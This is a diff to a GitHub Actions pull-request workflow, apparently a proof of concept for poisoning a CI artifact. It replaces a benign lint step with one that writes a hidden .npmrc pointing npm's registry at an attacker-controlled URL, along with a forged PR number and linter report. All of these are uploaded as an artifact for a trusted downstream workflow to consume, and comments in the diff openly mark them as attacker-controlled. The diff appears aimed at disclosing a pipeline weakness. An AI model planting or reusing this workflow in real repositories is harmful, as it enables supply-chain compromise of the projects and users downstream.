@@ -1,21 +1,30 @@
 name: ADP Target PR validation
+
 on:
   pull_request:
+
 permissions:
   contents: read
+
 jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
-      - name: Lint report
+      - name: Build attacker artifact payload
         run: |
-          echo "legit lint report" > linter-report.txt
-          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          mkdir -p payload
+          # .npmrc redirects npm's registry to an attacker-controlled location
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          # attacker-chosen PR number for the bot comment
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          printf 'attacker-controlled linter report\n' > payload/linter-report.txt
+          ls -la payload
       - name: Upload linter report
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@v4
         with:
           name: linter-report
-          path: |
-            linter-report.txt
-            pr-number.txt
-          if-no-files-found: ignore
+          path: payload/
+          include-hidden-files: true
+          if-no-files-found: error
+# rerun-trigger-2 npmreg4
+
